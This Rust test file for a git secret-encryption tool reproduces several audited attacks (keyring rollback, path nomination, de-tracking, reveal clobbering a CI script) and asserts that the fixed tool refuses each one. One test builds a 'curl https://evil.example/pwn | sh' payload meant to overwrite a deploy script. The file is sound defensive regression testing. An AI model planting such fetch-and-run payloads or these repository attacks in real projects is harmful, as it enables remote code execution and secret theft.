//! ATTACK REPRODUCTION TESTS and FIX REGRESSIONS.
//!
//! All three audit attacks are now FIXED; the tests below assert the refusals
//! (exit codes 14, 42, 72) plus the migration and normal-flow semantics of
//! each fix. The corresponding issues document the full attack analysis.

use age::secrecy::ExposeSecret;
use git_veil::{
    cmd_add, cmd_hide, cmd_import, cmd_init, cmd_remove, cmd_removeperson, cmd_reveal, cmd_tell,
    cmd_trust, cmd_unhide, cmd_verify_keyring, decrypt_with_identity, exit_code_of,
    generate_identity, generate_signing_keypair, recipient_from_identity, TrackedFiles,
};

use std::fs;
use std::path::Path;

// Harness copied from tests/features.rs (integration tests are separate
// crates and cannot share helpers).

struct TempDir {
    path: std::path::PathBuf,
}

impl TempDir {
    fn new(label: &str) -> Self {
        let pid = std::process::id();
        let counter = COUNTER.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
        let dir =
            std::env::temp_dir().join(format!("git-veil-attack-{}-{}-{}", label, pid, counter));
        fs::create_dir_all(&dir).expect("create temp dir");
        Self { path: dir }
    }
    fn join(&self, rel: &str) -> std::path::PathBuf {
        self.path.join(rel)
    }
}

impl Drop for TempDir {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.path);
    }
}

static COUNTER: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);

fn init_git_repo(dir: &Path) {
    let args_list: &[&[&str]] = &[
        &["init", "--quiet"],
        &["config", "user.email", "owner@example.com"],
        &["config", "user.name", "Test Owner"],
        &["remote", "add", "origin", "git@github.com:owner/fara.git"],
    ];
    for args in args_list {
        let s = std::process::Command::new("git")
            .current_dir(dir)
            .args(*args)
            .status()
            .expect("git");
        assert!(s.success());
    }
}

const TEST_REPO_ID: &str = "fara+owner@github.com";

struct Fixture {
    repo: TempDir,
    key_store: TempDir,
}

impl Fixture {
    fn new(label: &str) -> Self {
        let repo = TempDir::new(label);
        let key_store = TempDir::new(&format!("{}-ks", label));
        init_git_repo(&repo.path);

        let identity = generate_identity();
        let recipient = recipient_from_identity(&identity);
        let (signing_key, verifying_hex) = generate_signing_keypair();

        fs::write(
            repo.join("owner.age"),
            format!("{}\n", identity.to_string().expose_secret()),
        )
        .unwrap();
        fs::write(
            repo.join("owner.signing"),
            format!("{}\n{}\n", verifying_hex, recipient),
        )
        .unwrap();
        fs::write(
            key_store.join("signing-keys.txt"),
            format!("{}\n", hex::encode(signing_key.to_bytes())),
        )
        .unwrap();

        cmd_init(&repo.path).expect("init");
        cmd_import(&repo.path, &["owner.age".to_string()], &key_store.path).expect("import");
        cmd_trust(
            &repo.path,
            TEST_REPO_ID,
            "owner.signing",
            "origin",
            &key_store.path,
        )
        .expect("trust");

        Self { repo, key_store }
    }

    /// Tells a collaborator into the keyring; returns their identity so the
    /// test can later prove what that key can (still) decrypt.
    fn add_collab(&self, email: &str) -> age::x25519::Identity {
        let id = generate_identity();
        let r = recipient_from_identity(&id);
        let fname = format!("{}.recipient", email);
        fs::write(self.repo.join(&fname), &r).unwrap();
        cmd_tell(
            &self.repo.path,
            email,
            &fname,
            "origin",
            &self.key_store.path,
            None,
        )
        .expect("tell");
        id
    }

    fn add_file(&self, name: &str, content: &[u8]) {
        let p = self.repo.join(name);
        if let Some(parent) = p.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        fs::write(&p, content).unwrap();
        cmd_add(
            &self.repo.path,
            vec![name.to_string()],
            "origin",
            &self.key_store.path,
        )
        .expect("add");
    }

    fn hide(&self) {
        cmd_hide(&self.repo.path, "origin", &self.key_store.path, true).expect("hide");
    }

    /// Stages everything the way the owner's commit would, so the git index
    /// (which the orphan gate and later the intent gate read) reflects the
    /// committed state. The plaintext is gitignored, so this stages only
    /// ciphertext and .git-veil state.
    fn stage_all(&self) {
        let s = std::process::Command::new("git")
            .current_dir(&self.repo.path)
            .args(["add", "-A"])
            .status()
            .expect("git add");
        assert!(s.success());
    }
}

// ---------------------------------------------------------------------------
// Regression — keyring rollback is refused by the freshness baseline
// (issue #5, FIXED)
//
// Previously: removeperson produced keyring v2 (signed, entry removed); a
// repo writer restored v1 — a plain `git revert` — and it still verified,
// because the signature proves "the owner signed this at some point", not
// "this is current".
//
// Now: tell/removeperson bump a monotonic counter inside the signed payload,
// and every machine records the highest version it has accepted (beside the
// pin, outside the repo). Any regression is refused with exit 14.
// ---------------------------------------------------------------------------

#[test]
fn fix_keyring_rollback_refused_by_freshness_baseline() {
    let f = Fixture::new("keyring-rollback");

    let carol = f.add_collab("carol@example.com");
    f.add_file("secrets.env", b"TOKEN=old\n");
    f.hide();

    let keyring_path = f.repo.join(".git-veil/keyring");
    // Snapshot v1 (carol present, validly signed by the pinned owner key).
    let keyring_v1 = fs::read_to_string(&keyring_path).unwrap();
    assert!(keyring_v1.contains("carol@example.com"));

    // Owner revokes carol: keyring v2 (empty, re-signed) verifies fine.
    cmd_removeperson(
        &f.repo.path,
        "carol@example.com",
        "origin",
        &f.key_store.path,
        None,
    )
    .expect("removeperson");
    let keyring_v2 = fs::read_to_string(&keyring_path).unwrap();
    assert!(!keyring_v2.contains("carol@example.com"));
    cmd_verify_keyring(&f.repo.path, "origin", &f.key_store.path)
        .expect("v2 (empty, signed) verifies");

    // ATTACK: a repo writer restores the old keyring file content
    // (equivalent to `git revert` of the removeperson commit).
    fs::write(&keyring_path, &keyring_v1).unwrap();

    // FIXED: verification REFUSES the rolled-back keyring (exit 14) — the
    // signature is valid but the version regressed below the baseline.
    let err = cmd_verify_keyring(&f.repo.path, "origin", &f.key_store.path)
        .expect_err("rolled-back keyring must be refused");
    assert_eq!(
        exit_code_of(&err),
        14,
        "keyring rollback must exit with the documented code 14"
    );

    // And hide (like every gated command) refuses on the same check.
    let err = cmd_hide(&f.repo.path, "origin", &f.key_store.path, true)
        .expect_err("hide must refuse on the rolled-back keyring");
    assert_eq!(exit_code_of(&err), 14);

    // The stale v1 ciphertext on disk is untouched: carol still decrypts
    // what she always could, but no NEW secret can flow to her — hide
    // refused. That refusal is the fix.

    // RECOVERY: a genuinely intended rollback is re-anchored with trust,
    // which resets the freshness baseline along with the pin.
    cmd_trust(
        &f.repo.path,
        TEST_REPO_ID,
        "owner.signing",
        "origin",
        &f.key_store.path,
    )
    .expect("re-trust");
    cmd_verify_keyring(&f.repo.path, "origin", &f.key_store.path)
        .expect("verify succeeds after the re-trust reset the baseline");
    let _ = carol;
}

// ---------------------------------------------------------------------------
// Regression — keyring version migration semantics (issue #5)
// ---------------------------------------------------------------------------

/// Re-signs `keyring_text`'s keyring block with the fixture's owner key,
/// returning a full keyring file (block + fresh signature).
fn resigned(keyring_text: &str, version: Option<u64>, f: &Fixture) -> String {
    let mut kr = git_veil::Keyring::parse(keyring_text).unwrap();
    kr.version = version;
    kr.signature = None;
    let content = git_veil::extract_content_to_verify_from_keyring(&kr.serialize()).unwrap();
    let seed = fs::read_to_string(f.key_store.join("signing-keys.txt")).unwrap();
    let signing_key = git_veil::parse_signing_key(seed.trim()).unwrap();
    format!(
        "{}{}",
        kr.serialize(),
        git_veil::create_signature_block(&content, &signing_key).unwrap()
    )
}

#[test]
fn fix_versionless_keyring_is_a_migration_state_not_a_rollback() {
    let f = Fixture::new("migration-forward");
    // tell writes version 1 and hide's verify records baseline 1.
    let _carol = f.add_collab("carol@example.com");
    f.add_file("secrets.env", b"TOKEN=x\n");
    f.hide();
    let keyring_path = f.repo.join(".git-veil/keyring");

    // A versionless keyring (pre-freshness format) counts as version 0, so
    // once a versioned baseline exists it is a rollback: refused.
    let versionless = resigned(&fs::read_to_string(&keyring_path).unwrap(), None, &f);
    fs::write(&keyring_path, &versionless).unwrap();
    let err = cmd_verify_keyring(&f.repo.path, "origin", &f.key_store.path)
        .expect_err("versionless keyring must be refused once a versioned baseline exists");
    assert_eq!(exit_code_of(&err), 14);

    // But on a machine with NO baseline (the real migration case), a
    // versionless signed keyring is accepted and establishes baseline 0.
    let f2 = Fixture::new("migration-fresh");
    let _carol2 = f2.add_collab("carol@example.com");
    let versionless2 = resigned(
        &fs::read_to_string(&f2.repo.join(".git-veil/keyring")).unwrap(),
        None,
        &f2,
    );
    // Rebuild the scenario: baseline is already established by tell's
    // verify? No — tell's verify saw the EMPTY unsigned keyring (observed 0,
    // baseline 0), and no gated command ran since the v1 write, so the
    // baseline is still 0 and a versionless keyring is NOT a regression.
    fs::write(f2.repo.join(".git-veil/keyring"), &versionless2).unwrap();
    cmd_verify_keyring(&f2.repo.path, "origin", &f2.key_store.path)
        .expect("versionless keyring accepted while the baseline is still 0");

    // The next versioned keyring (v1) is then free to establish baseline 1,
    // after which the versionless state is refused as a rollback.
    let versioned = resigned(&versionless2, Some(1), &f2);
    fs::write(f2.repo.join(".git-veil/keyring"), &versioned).unwrap();
    cmd_verify_keyring(&f2.repo.path, "origin", &f2.key_store.path)
        .expect("versioned keyring accepted, baseline advances to 1");
    fs::write(f2.repo.join(".git-veil/keyring"), &versionless2).unwrap();
    let err = cmd_verify_keyring(&f2.repo.path, "origin", &f2.key_store.path)
        .expect_err("versionless keyring refused now that the baseline is 1");
    assert_eq!(exit_code_of(&err), 14);
}

#[test]
fn fix_malformed_version_lines_are_parse_failures() {
    use git_veil::{Keyring, BEGIN_MARKER, END_MARKER};

    for bad in ["version:abc", "version:", "version:-1", "version:1.0"] {
        let text = format!("{}\n{}\n{}\n", BEGIN_MARKER, bad, END_MARKER);
        let err = Keyring::parse(&text).expect_err(bad);
        assert_eq!(
            exit_code_of(&err),
            62,
            "malformed version line must be a parse failure"
        );
    }

    // A duplicate version line is refused, never silently accepted.
    let dup = format!("{}\nversion:1\nversion:2\n{}\n", BEGIN_MARKER, END_MARKER);
    let err = Keyring::parse(&dup).expect_err("duplicate version");
    assert_eq!(exit_code_of(&err), 62);
}

// ---------------------------------------------------------------------------
// Regression — nominated paths are refused at hide time (issue #6, FIXED)
//
// Previously: tracked.json is committed and unsigned, so a repo writer
// nominated a victim's gitignored secret into it; the victim's next hide
// encrypted it to the whole ring — silently (the gitignored plaintext never
// trips the code-41 warning).
//
// Now: `add` records intent in a machine-local log in the key store, and
// hide refuses (exit 72) to FIRST-encrypt any tracked path that has neither
// a committed ciphertext nor recorded intent. See "Encryption intent" in
// docs/design.md.
// ---------------------------------------------------------------------------

#[test]
fn fix_nominated_path_refused_at_hide() {
    let f = Fixture::new("tracked-nomination");

    // The attacker is a legitimate keyring member (repo write access).
    let _mallory = f.add_collab("mallory@example.com");

    // Victim's private file: gitignored, NEVER passed to `git-veil add`.
    let secret_plaintext = b"AWS_SECRET_ACCESS_KEY=AKIA...\n";
    fs::write(f.repo.join("prod-credentials"), secret_plaintext).unwrap();
    fs::write(f.repo.join(".gitignore"), "prod-credentials\n").unwrap();

    // ATTACK: the repo writer edits the committed tracked.json directly
    // (this file is not covered by the keyring signature).
    fs::write(
        f.repo.join(".git-veil/tracked.json"),
        "{\n  \"files\": [\n    \"prod-credentials\"\n  ]\n}",
    )
    .unwrap();

    // FIXED: hide refuses (exit 72) — no ciphertext is created, nothing is
    // exfiltrated.
    let err = cmd_hide(&f.repo.path, "origin", &f.key_store.path, true)
        .expect_err("hide must refuse a nominated path with no intent and no ciphertext");
    assert_eq!(
        exit_code_of(&err),
        72,
        "nomination must exit with the documented code 72"
    );
    assert!(
        !f.repo.join("prod-credentials.secret").exists(),
        "no ciphertext may be written for a nominated path"
    );

    // REMEDY (the tracking is wanted): the victim's own add binds intent on
    // this machine, and hide then proceeds.
    cmd_add(
        &f.repo.path,
        vec!["prod-credentials".to_string()],
        "origin",
        &f.key_store.path,
    )
    .expect("victim re-adds deliberately");
    cmd_hide(&f.repo.path, "origin", &f.key_store.path, true).expect("hide after intent");
}

#[test]
fn fix_established_ciphertext_needs_no_intent() {
    // Rotation/fresh-clone flow: a committed ciphertext re-encrypts on this
    // machine without a local add — ordinary collaboration and CI are
    // unaffected by the intent gate.
    let f = Fixture::new("established-ciphertext");

    let _carol = f.add_collab("carol@example.com");
    f.add_file("secrets.env", b"TOKEN=v1\n");
    f.hide();
    f.stage_all(); // the owner commits: ciphertext is now in the index

    // Simulate a fresh clone's state: a new machine, new key store with no
    // intent log, pinning the SAME owner verifying key (delivered out of
    // band or as the committed owner.verifying).
    let fresh_store = TempDir::new("established-fresh-ks");
    let owner_verifying = fs::read_to_string(f.repo.join("owner.signing")).unwrap();
    let owner_verifying_hex = owner_verifying.lines().next().unwrap().to_string();
    fs::write(
        f.repo.join("fresh.signing"),
        format!("{}\n", owner_verifying_hex),
    )
    .unwrap();
    fs::write(
        fresh_store.join("signing-keys.txt"),
        // The fresh store's signing key need not match the owner's — hide
        // only encrypts; what matters is the PIN matching the ring's signer.
        "0000000000000000000000000000000000000000000000000000000000000000\n",
    )
    .unwrap();
    cmd_trust(
        &f.repo.path,
        TEST_REPO_ID,
        "fresh.signing",
        "origin",
        &fresh_store.path,
    )
    .expect("trust");

    // No intent was ever recorded in fresh_store, but secrets.env.secret is
    // committed, so hide proceeds.
    cmd_hide(&f.repo.path, "origin", &fresh_store.path, true)
        .expect("committed ciphertext re-encrypts without local intent");
}

// ---------------------------------------------------------------------------
// Regression — de-tracking no longer defeats rotation (issue #7, FIXED)
//
// Previously: a repo writer removed a path from tracked.json; the owner's
// removeperson + re-hide silently skipped the stale ciphertext, which the
// removed collaborator could still decrypt.
//
// Now: hide's orphaned-ciphertext gate (exit 42, see "Orphaned ciphertext"
// in docs/design.md) refuses to run while a committed .secret exists for an
// untracked path, so the de-tracking-then-rotate attack fails loudly. The
// owner-side remedy — `git-veil remove` now deletes the sibling ciphertext
// by default — is covered by the remove tests below.
// ---------------------------------------------------------------------------

#[test]
fn fix_detracking_orphan_ciphertext_refuses_hide() {
    let f = Fixture::new("detrack-rotation");

    let carol = f.add_collab("carol@example.com");
    let plaintext = b"API_KEY=live-key\n";
    f.add_file("api.key", plaintext);
    f.hide();
    assert!(f.repo.join("api.key.secret").exists());
    // The orphan gate reads the git INDEX (what gets pushed), so stage the
    // ciphertext the way the owner's commit would.
    f.stage_all();

    // ATTACK: a repo writer de-tracks the file before the rotation
    // (tracked.json is committed and unsigned).
    fs::write(
        f.repo.join(".git-veil/tracked.json"),
        "{\n  \"files\": []\n}",
    )
    .unwrap();

    // Owner rotates: revoke carol, onboard dave, re-hide.
    cmd_removeperson(
        &f.repo.path,
        "carol@example.com",
        "origin",
        &f.key_store.path,
        None,
    )
    .expect("removeperson");
    let _dave = f.add_collab("dave@example.com");

    // FIXED: hide refuses outright (exit 42) while the stale ciphertext is
    // committed but untracked — rotation can no longer skip it silently.
    let err = cmd_hide(&f.repo.path, "origin", &f.key_store.path, true)
        .expect_err("hide must refuse orphaned committed ciphertext");
    assert_eq!(
        exit_code_of(&err),
        42,
        "orphaned ciphertext must exit with the documented code 42"
    );

    // REMEDY (de-tracking was intentional): delete the stale ciphertext…
    fs::remove_file(f.repo.join("api.key.secret")).unwrap();
    // …re-track the file (the manifest was emptied by the attack), stage,
    // and hide to the new ring.
    f.add_file("api.key", plaintext);
    f.stage_all();
    f.hide();

    // The revoked collaborator can no longer decrypt the live ciphertext.
    let ciphertext = fs::read(f.repo.join("api.key.secret")).unwrap();
    assert!(
        decrypt_with_identity(&ciphertext, &carol).is_err(),
        "revoked carol must not decrypt the post-rotation ciphertext"
    );
}

// ---------------------------------------------------------------------------
// Regression — `remove` deletes the sibling ciphertext by default
// (issue #7). The honest way to keep an untracked ciphertext is now the
// explicit --keep-ciphertext flag, after which hide refuses the orphan.
// ---------------------------------------------------------------------------

#[test]
fn fix_remove_deletes_ciphertext_by_default() {
    let f = Fixture::new("remove-default");
    let _carol = f.add_collab("carol@example.com");
    f.add_file("api.key", b"API_KEY=x\n");
    f.hide();
    assert!(f.repo.join("api.key.secret").exists());

    cmd_remove(&f.repo.path, vec!["api.key".to_string()], false).expect("remove");
    assert!(
        !f.repo.join("api.key.secret").exists(),
        "remove must delete the sibling ciphertext by default"
    );
    assert!(
        !TrackedFiles::load(&f.repo.join(".git-veil/tracked.json"))
            .unwrap()
            .files
            .contains(&"api.key".into()),
        "remove must untrack the file"
    );
}

#[test]
fn fix_remove_keep_ciphertext_trips_the_orphan_gate() {
    let f = Fixture::new("remove-keep");
    let _carol = f.add_collab("carol@example.com");
    f.add_file("api.key", b"API_KEY=x\n");
    f.hide();
    f.stage_all();

    cmd_remove(&f.repo.path, vec!["api.key".to_string()], true).expect("remove");
    assert!(
        f.repo.join("api.key.secret").exists(),
        "--keep-ciphertext leaves the ciphertext in place"
    );

    // hide now refuses the orphan with exit 42 until it is resolved.
    let err = cmd_hide(&f.repo.path, "origin", &f.key_store.path, true)
        .expect_err("hide must refuse the kept-back orphaned ciphertext");
    assert_eq!(exit_code_of(&err), 42);
}

// ---------------------------------------------------------------------------
// Regression — reveal/unhide refuse a tracked-in-git plaintext
// (issue #8, FIXED — reveal-clobber hardening)
//
// Previously: a repo writer nominated a tracked-in-git source file in
// tracked.json and committed a payload ciphertext encrypted to the ring's
// public keys; the victim's reveal overwrote the source file (RCE in the
// documented CI flow).
//
// Now: reveal/unhide refuse (exit 43) when the target plaintext is tracked
// in git — a git-tracked plaintext is repository content, not a secret.
// ---------------------------------------------------------------------------

#[test]
fn fix_reveal_refuses_tracked_in_git_plaintext() {
    let f = Fixture::new("f1-reveal-clobber");

    // The victim: a legitimate collaborator with an identity in their key
    // store (this store simulates the victim's machine).
    let victim = generate_identity();
    let victim_recipient = recipient_from_identity(&victim);
    fs::write(f.repo.join("victim.recipient"), &victim_recipient).unwrap();
    cmd_tell(
        &f.repo.path,
        "victim@example.com",
        "victim.recipient",
        "origin",
        &f.key_store.path,
        None,
    )
    .expect("tell victim");
    fs::write(
        f.repo.join("victim.age"),
        format!("{}\n", victim.to_string().expose_secret()),
    )
    .unwrap();
    cmd_import(&f.repo.path, &["victim.age".to_string()], &f.key_store.path)
        .expect("import victim");

    // A NORMAL repo source file, tracked in git — never a secret, never
    // git-veil add'ed. The victim would never hide this.
    fs::create_dir_all(f.repo.join("ci")).unwrap();
    let legitimate = "#!/bin/sh\necho legitimate\n";
    fs::write(f.repo.join("ci/deploy.sh"), legitimate).unwrap();

    // ATTACK: a repo writer nominates the source file in tracked.json and
    // commits a payload ciphertext encrypted to the ring's PUBLIC keys
    // (no signing key needed — only the keyring signature must verify,
    // and the attacker leaves the keyring untouched).
    fs::write(
        f.repo.join(".git-veil/tracked.json"),
        "{\n  \"files\": [\n    \"ci/deploy.sh\"\n  ]\n}",
    )
    .unwrap();

    let keyring_text = fs::read_to_string(f.repo.join(".git-veil/keyring")).unwrap();
    let ring = git_veil::Keyring::parse(&keyring_text).unwrap();
    let recipients: Vec<_> = ring
        .entries
        .iter()
        .map(|e| git_veil::parse_recipient(&e.recipient).unwrap())
        .collect();
    let payload = b"#!/bin/sh\ncurl https://evil.example/pwn | sh\n";
    let evil_ct = git_veil::encrypt_to_recipients(payload, &recipients).unwrap();
    fs::write(f.repo.join("ci/deploy.sh.secret"), evil_ct).unwrap();
    f.stage_all(); // attacker commits tracked.json + the evil ciphertext

    // FIXED: reveal refuses (exit 43) — the tracked-in-git source file is
    // not overwritten.
    let err = cmd_reveal(
        &f.repo.path,
        "victim@example.com",
        "origin",
        &f.key_store.path,
    )
    .expect_err("reveal must refuse a git-tracked plaintext");
    assert_eq!(
        exit_code_of(&err),
        43,
        "tracked-plaintext clobber must exit with the documented code 43"
    );
    assert_eq!(
        fs::read_to_string(f.repo.join("ci/deploy.sh")).unwrap(),
        legitimate,
        "the source file must be untouched"
    );

    // And unhide refuses the same way.
    let err = cmd_unhide(
        &f.repo.path,
        "ci/deploy.sh",
        "victim@example.com",
        "origin",
        &f.key_store.path,
    )
    .expect_err("unhide must refuse a git-tracked plaintext");
    assert_eq!(exit_code_of(&err), 43);
}

#[test]
fn fix_reveal_still_works_for_gitignored_plaintexts() {
    // The normal flow: plaintext gitignored (never in the index), the
    // committed ciphertext reveals fine — the exit-43 gate must not
    // disturb legitimate reveal/unhide.
    let f = Fixture::new("reveal-normal");
    let _carol = f.add_collab("carol@example.com");
    // The owner must be in the keyring too for the reveal below (their
    // identity IS in the key store; the recipient is owner.signing line 2).
    let owner_signing = fs::read_to_string(f.repo.join("owner.signing")).unwrap();
    let owner_recipient = owner_signing.lines().nth(1).unwrap().trim();
    fs::write(f.repo.join("owner.recipient"), owner_recipient).unwrap();
    cmd_tell(
        &f.repo.path,
        "owner@example.com",
        "owner.recipient",
        "origin",
        &f.key_store.path,
        None,
    )
    .expect("tell owner");
    let secret = b"TOKEN=v1\n";
    f.add_file("secrets.env", secret);
    f.hide();
    f.stage_all();

    fs::remove_file(f.repo.join("secrets.env")).unwrap(); // hidden state
    cmd_reveal(
        &f.repo.path,
        "owner@example.com",
        "origin",
        &f.key_store.path,
    )
    .expect("reveal of a gitignored tracked plaintext must work");
    assert_eq!(fs::read(f.repo.join("secrets.env")).unwrap(), secret);

    cmd_unhide(
        &f.repo.path,
        "secrets.env",
        "owner@example.com",
        "origin",
        &f.key_store.path,
    )
    .expect("unhide of a gitignored tracked plaintext must work");
}
